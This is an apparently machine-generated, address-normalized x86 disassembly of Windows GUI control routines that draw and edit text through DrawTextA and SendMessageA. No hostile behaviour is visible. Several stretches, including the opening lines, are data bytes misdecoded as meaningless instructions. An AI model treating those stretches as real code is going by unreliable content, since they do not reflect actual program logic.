inc esp
add [ eax + ecx * 2 + 0x44 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305000f ] al
je r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0xc865646f
mov es [ ebx ]
je r-xdata
inc edx
inc ebx
je r-xdata
imul edi [ edx + 0x65 ] r-xdata
push ebx
adc [ eax ] al
adc [ edx ] al
add bh bh
cmp al 0x76
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ss
add [ ebx ] al
dec ebp
imul ebp [ esi + 0x3c ] 0x18004010
add al [ eax ]
jmp esp
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add [ gs : eax ] dl
xor eax [ eax - 0x7a ]
inc ebx
add [ edx ] bh
add bh bh
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b000e ] al
outsd
outsb
jae r-xdata
add eax [ eax + eax + 0x1 ]
insb
jae r-xdata
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
add [ eax ] al
[ eax ]
rol [ ebx ] cl
mov ah 0xd2
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
sub_4334e0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4463c0
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0xb9
mov eax esi
call sub_43d680
mov edx 0x69
mov eax esi
call sub_43d6a4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax esi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_43353c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_440764
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x208 ]
call sub_41d548
mov edx r-xdata
mov eax [ ebx + 0x208 ]
call sub_41d4a4
add [ esi + 0x4 ] eax
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
pop esi
pop ebx
retn
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
sub_4335a8
push ebp
mov ebp esp
mov ecx 0x11
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_43394a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x208 ]
mov edx [ ebx + 0x68 ]
mov eax edi
call sub_41d548
call sub_42f650
call sub_42f730
test al al
je r-xdata
mov edx r-xdata
mov eax edi
call sub_41d4a4
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ ebp - 0x1d ]
push eax
mov edx [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
lea edx [ ebp - 0x50 ]
mov eax ebx
call sub_43dec4
cmp [ ebp - 0x50 ] 0x0
je r-xdata
dec edx
mov ecx [ ebx + 0x48 ]
xor eax eax
call sub_412594
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
adc edx 0x0
push 0x0
lea eax [ ebp - 0x2d ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_412594
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x54 ]
mov eax ebx
call sub_43dec4
mov eax [ ebp - 0x54 ]
call sub_40427c
push eax
lea edx [ ebp - 0x58 ]
mov eax ebx
call sub_43dec4
mov eax [ ebp - 0x58 ]
call sub_40447c
push eax
mov eax edi
call sub_41d628
push eax
call GetTextExtentPoint32A
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
mov ecx [ ebp - 0xc ]
xor edx edx
xor eax eax
call sub_412594
mov eax ebx
mov si 0xffc8
call sub_403468
test al al
jne r-xdata
mov edx 0xff000006
mov eax [ edi + 0x14 ]
call sub_41ce60
inc [ ebp - 0x1d ]
inc [ ebp - 0x19 ]
mov edx 0xff000014
mov eax [ edi + 0x14 ]
call sub_41ce60
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_41d240
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x1d ]
push eax
call OffsetRect
mov edx 0xff000010
mov eax [ edi + 0x14 ]
call sub_41ce60
jmp r-xdata
mov [ ebp - 0x39 ] eax
mov eax [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x25 ]
push eax
mov eax [ ebp - 0x29 ]
push eax
mov eax [ ebp - 0x2d ]
push eax
mov eax edi
call sub_41d628
push eax
call ExcludeClipRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x48 ]
sub eax 0x8
sub eax [ ebp - 0x25 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
push 0x0
push 0x8
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433951
lea eax [ ebp - 0x8c ]
mov edx 0x5
call sub_403fe0
lea eax [ ebp - 0x68 ]
mov edx 0x2
call sub_403fe0
lea eax [ ebp - 0x60 ]
call sub_40469c
lea eax [ ebp - 0x5c ]
mov edx 0x4
call sub_403fe0
retn
mov eax ebx
mov si 0xffc8
call sub_403468
test al al
jne r-xdata
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_41d240
lea edx [ ebp - 0x68 ]
mov eax ebx
call sub_43dec4
cmp [ ebp - 0x68 ] 0x0
je r-xdata
mov [ ebp - 0xd ] 0x1c
mov [ ebp - 0xd ] 0x1b
jmp r-xdata
lea edx [ ebp - 0x3d ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x21 ]
sub eax [ ebp - 0x29 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
lea edx [ ebp - 0x7c ]
mov eax ebx
call sub_43dec4
mov edx [ ebp - 0x7c ]
mov eax [ ebx + 0x208 ]
call sub_41d488
push eax
mov eax [ ebp - 0x15 ]
pop edx
sub eax edx
sub eax 0x8
xor ecx ecx
xor edx edx
call sub_412594
push edi
lea esi [ ebp - 0x78 ]
lea edi [ ebp - 0x1d ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x1d ]
push eax
xor ecx ecx
xor edx edx
mov eax 0x8
call sub_412594
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax ebx
call sub_43dec4
mov edx [ ebp - 0x64 ]
lea eax [ ebp - 0x60 ]
call sub_4047e8
mov eax [ ebp - 0x60 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
push 0x0
push 0x0
mov eax edi
call sub_41d628
push eax
call sub_42f650
lea ecx [ ebp - 0x4c ]
pop edx
call sub_42f930
jmp r-xdata
call sub_42f650
lea ecx [ ebp - 0x4c ]
mov dl [ ebp - 0xd ]
call sub_42f994
lea eax [ ebp - 0x3d ]
push eax
push 0x0
mov eax edi
call sub_41d628
push eax
call sub_42f650
lea ecx [ ebp - 0x4c ]
pop edx
call sub_42f83c
push 0x0
mov eax edi
call sub_41d628
push eax
call SelectClipRgn
lea edx [ ebp - 0x5c ]
mov eax ebx
call sub_43dec4
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov edx 0x20
mov eax ebx
call sub_4401f0
mov esi eax
mov eax esi
or eax 0x400
push eax
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x80 ]
mov eax ebx
call sub_43dec4
mov eax [ ebp - 0x80 ]
call sub_40427c
push eax
lea edx [ ebp - 0x84 ]
mov eax ebx
call sub_43dec4
mov eax [ ebp - 0x84 ]
call sub_40447c
push eax
mov eax edi
call sub_41d628
push eax
call DrawTextA
mov edx [ ebx + 0x70 ]
mov eax [ edi + 0x14 ]
call sub_41ce60
push esi
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x88 ]
mov eax ebx
call sub_43dec4
mov eax [ ebp - 0x88 ]
call sub_40427c
push eax
lea edx [ ebp - 0x8c ]
mov eax ebx
call sub_43dec4
mov eax [ ebp - 0x8c ]
call sub_40447c
push eax
mov eax edi
call sub_41d628
push eax
call DrawTextA
sub_43395b
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4339d6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43dec4
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_455a9c
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_443b7c
mov eax ebx
mov si 0xffb8
call sub_403468
test al al
je r-xdata
mov eax ebx
call sub_444c58
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4339dd
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
sub_433a28
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_445940
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x41
mov eax esi
call sub_43d680
mov edx 0x11
mov eax esi
call sub_43d6a4
mov [ esi + 0x16d ] 0x1
mov [ esi + 0x170 ] 0x1
call sub_42f650
call sub_42f730
test al al
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
mov eax esi
test bl bl
je r-xdata
sub_433ad4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_433c2a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x90 ]
test esi 0x400
je r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4401f0
mov esi eax
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x160 ]
call sub_41d548
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
or esi 0x800
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404284
cmp [ ebx + 0x170 ] 0x0
je r-xdata
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_40427c
push eax
mov eax [ ebp - 0x4 ]
call sub_40447c
push eax
mov eax [ ebx + 0x160 ]
call sub_41d628
push eax
call DrawTextA
push 0x1
push 0x1
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_41c694
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_40427c
push eax
mov eax [ ebp - 0x4 ]
call sub_40447c
push eax
mov eax [ ebx + 0x160 ]
call sub_41d628
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_41c694
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_40427c
push eax
mov eax [ ebp - 0x4 ]
call sub_40447c
push eax
mov eax [ ebx + 0x160 ]
call sub_41d628
push eax
call DrawTextA
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x26
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433c31
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
sub_433c3b
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffffd0
mov ebx eax
mov esi [ ebx + 0x160 ]
mov eax ebx
call sub_433e64
test al al
jne r-xdata
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_41cf7c
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor eax eax
mov al [ ebx + 0x16f ]
mov di [ eax * 2 + rw-data ]
or di 0x40
xor eax eax
mov al [ ebx + 0x16c ]
or di [ eax * 2 + rw-data ]
movzx edi di
cmp [ ebx + 0x16e ] 0x0
je r-xdata
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_41ce60
xor edx edx
mov eax [ esi + 0x14 ]
call sub_41cf7c
lea edx [ esp + 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x20 ]
mov eax esi
call sub_41d204
mov edx esp
mov ecx edi
mov eax ebx
mov si 0xffc6
call sub_403468
add esp 0x30
pop edi
pop esi
pop ebx
retn
push edi
lea esi [ esp + 0x4 ]
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov ecx edi
or ecx 0x400
lea edx [ esp + 0x10 ]
mov eax ebx
mov si 0xffc6
call sub_403468
cmp [ ebx + 0x16e ] 0x2
jne r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
sar eax 0x1
jns r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
jmp r-xdata
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
adc eax 0x0
sub_433d5c
push ebx
push esi
push edi
add esp 0xffffffec
mov edi eax
test [ edi + 0x1c ] 0x2
jne r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x16d ] 0x0
je r-xdata
lea edx [ esp + 0x1 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0x0
call GetDC
mov ebx eax
mov edx ebx
mov eax [ edi + 0x160 ]
call sub_41d6a8
xor eax eax
mov al [ edi + 0x16f ]
mov cx [ eax * 2 + rw-data ]
or cx 0x440
movzx ecx cx
lea edx [ esp + 0x1 ]
mov eax edi
mov si 0xffc6
call sub_403468
xor edx edx
mov eax [ edi + 0x160 ]
call sub_41d6a8
push ebx
push 0x0
call ReleaseDC
mov ebx [ edi + 0x40 ]
mov al [ edi + 0x16c ]
mov [ esp ] al
mov eax edi
mov si 0xffc8
call sub_403468
test al al
je r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax esp
call sub_43ac50
mov eax [ esp + 0x9 ]
push eax
mov eax [ esp + 0x11 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ edi + 0x48 ]
sub eax [ esp + 0x9 ]
add ebx eax
sub_433ea0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_433e64
cmp bl al
je r-xdata
mov [ esi + 0x188 ] 0x1
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_433f00
push esi
push edi
mov edi eax
cmp dl [ edi + 0x16f ]
je r-xdata
pop edi
pop esi
retn
mov [ edi + 0x16f ] dl
mov eax edi
mov si 0xffc7
call sub_403468
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_433f28
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43d394
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x168 ]
jne r-xdata
xor eax eax
mov [ edi + 0x168 ] eax
sub_433f8c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_434019
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x168 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434020
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43dec4
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_455a9c
test al al
je r-xdata
mov ebx [ ebx + 0x168 ]
mov eax ebx
mov si 0xffb8
call sub_403468
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
sub_434070
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_440424
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x79
mov eax esi
call sub_43d680
mov edx 0x19
mov eax esi
call sub_43d6a4
mov dl 0x1
mov eax esi
call sub_44492c
xor edx edx
mov eax esi
call sub_43e088
mov [ esi + 0x20c ] 0x1
mov [ esi + 0x20f ] 0x1
mov [ esi + 0x210 ] 0x1
mov [ esi + 0x211 ] 0x1
mov eax esi
call sub_434774
mov eax esi
test bl bl
je r-xdata
sub_434118
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0xc5
mov eax ebx
call sub_4446f8
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_434184
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x208 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x208 ] esi
mov eax ebx
call sub_4449fc
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc8 ]
sub_4341b4
push ebx
push esi
mov esi eax
mov bl [ esi + 0x215 ]
mov eax esi
call sub_4449fc
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb8
mov eax esi
call sub_4446f8
push eax
call SendMessageA
test eax eax
setne bl
sub_4341ec
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4449fc
test al al
je r-xdata
mov [ esi + 0x215 ] bl
pop esi
pop ebx
retn
push 0x0
xor eax eax
mov al bl
push eax
push 0xb9
mov eax esi
call sub_4446f8
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_434224
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4342a1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x20d ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4342a8
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
mov [ ebx + 0x20d ] dl
mov eax ebx
call sub_4449fc
test al al
je r-xdata
push 0x0
xor eax eax
mov al [ ebx + 0x20d ]
push eax
push 0xcc
mov eax ebx
call sub_4446f8
push eax
call SendMessageA
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43dec4
mov eax [ ebp - 0x4 ]
call sub_40447c
mov edx eax
mov eax ebx
call sub_43dea0
sub_4342ac
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x20e ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x20e ] bl
mov eax esi
call sub_4449fc
test al al
je r-xdata
push 0x0
xor eax eax
mov al bl
push eax
push 0xcf
mov eax esi
call sub_4446f8
push eax
call SendMessageA
sub_4342e8
push ebx
push ecx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_4446f8
push eax
call SendMessageA
mov eax [ esp ]
pop edx
pop ebx
retn
sub_43430c
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push esi
push 0xb1
mov eax ebx
call sub_4446f8
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_43432c
push ebx
add esp 0xfffffff8
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_4446f8
push eax
call SendMessageA
mov eax [ esp + 0x4 ]
sub eax [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_43435c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_4446f8
push eax
call SendMessageA
add esi [ esp ]
mov [ esp + 0x4 ] esi
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0xb1
mov eax ebx
call sub_4446f8
push eax
call SendMessageA
push 0x0
push 0x0
push 0xb7
mov eax ebx
call sub_4446f8
push eax
call SendMessageA
pop ecx
pop edx
pop esi
pop ebx
retn
sub_434414
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_43de38
inc eax
call sub_4086b8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43449e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_4086cc
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_43de48
cmp edi [ ebp - 0x8 ]
jg r-xdata
mov edx [ ebp - 0xc ]
add edx esi
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408530
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4344a5
mov eax [ ebp - 0xc ]
call sub_408704
retn
dec edi
mov [ ebp - 0x8 ] edi
sub_4344b0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov [ ebp - 0x8 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov esi eax
mov eax edi
mov ecx esi
xor edx edx
call sub_4040ac
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
call sub_43de38
inc eax
call sub_4086b8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43453e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4086cc
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_43de48
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
add eax edx
mov edx [ edi ]
mov ecx esi
call sub_4028b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_408704
retn
sub_43454c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_441584
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_4414b0
mov eax [ esi + 0x4 ]
or eax 0xc0
xor edx edx
mov dl [ ebx + 0x20c ]
or eax [ edx * 4 + rw-data ]
cmp [ ebx + 0x20d ] 0x0
setne dl
and edx 0x7f
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x20e ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x213 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x211 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x212 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_434605
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffff74
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax ebx
call sub_441880
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ edx + 0x5 ] 0x8
je r-xdata
mov esi edx
mov edi esp
mov ecx 0x23
[ edi ] [ esi ]
and [ esp + 0x4 ] 0xfffff7ff
mov edx esp
mov eax ebx
call sub_441880
mov eax [ ebx + 0x180 ]
test eax eax
je r-xdata
add esp 0x8c
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x1
push 0xcf
push eax
call SendMessageA
jmp r-xdata
sub_434678
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x1
xor eax eax
push ebp
push sub_4346b7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4416b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4346be
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x0
retn
sub_4346be
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x208 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc8 ]
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x215 ]
mov eax [ ebp - 0x4 ]
call sub_4341ec
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20d ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_434738
pop ecx
pop ebp
retn
push 0x0
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20d ]
push eax
push 0xcc
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
call SendMessageA
sub_434738
push ebx
mov ebx eax
cmp [ ebx + 0x20f ] 0x0
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
pop ebx
retn
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_434774
pop ebx
retn
sub_434774
push ebx
push esi
push edi
add esp 0xffffff90
mov esi eax
push 0x0
call GetDC
mov ebx eax
push esp
push ebx
call GetTextMetricsA
mov eax [ esi + 0x68 ]
call sub_41c6a8
push eax
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x38 ]
push eax
push ebx
call GetTextMetricsA
push edi
push ebx
call SelectObject
push ebx
push 0x0
call ReleaseDC
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov ebx [ esp ]
mov eax [ esp + 0x38 ]
cmp ebx eax
jle r-xdata
cmp [ esi + 0x1a5 ] 0x0
je r-xdata
push 0x6
call GetSystemMetrics
shl eax 0x2
test ebx ebx
jns r-xdata
mov ebx eax
mov ebx 0x6
mov ebx 0x8
jmp r-xdata
sar ebx 0x2
add eax ebx
mov ebx eax
add ebx 0x3
mov edx [ esp + 0x38 ]
add edx ebx
mov eax esi
call sub_43d6a4
add esp 0x70
pop edi
pop esi
pop ebx
retn
push 0x6
call GetSystemMetrics
imul ebx
mov ebx eax
jmp r-xdata
sub_434840
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0x7
jne r-xdata
mov edx ebx
mov eax esi
call sub_442270
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
jne r-xdata
xor eax eax
mov [ ebx + 0x4 ] eax
sub_434878
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
retn
push 0xfffffff0
mov eax esi
call sub_4446f8
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
push 0x0
push 0x3
push 0xd3
mov eax esi
call sub_4446f8
push eax
call SendMessageA
sub_4348b8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_443d10
pop esi
pop ebx
retn
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
mov eax ebx
call sub_434738
mov eax ebx
call sub_441c98
sub_4348ec
push ebx
mov ebx eax
mov eax ebx
call sub_443c54
test [ ebx + 0x51 ] 0x2
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_434774
test [ ebx + 0x1c ] 0x1
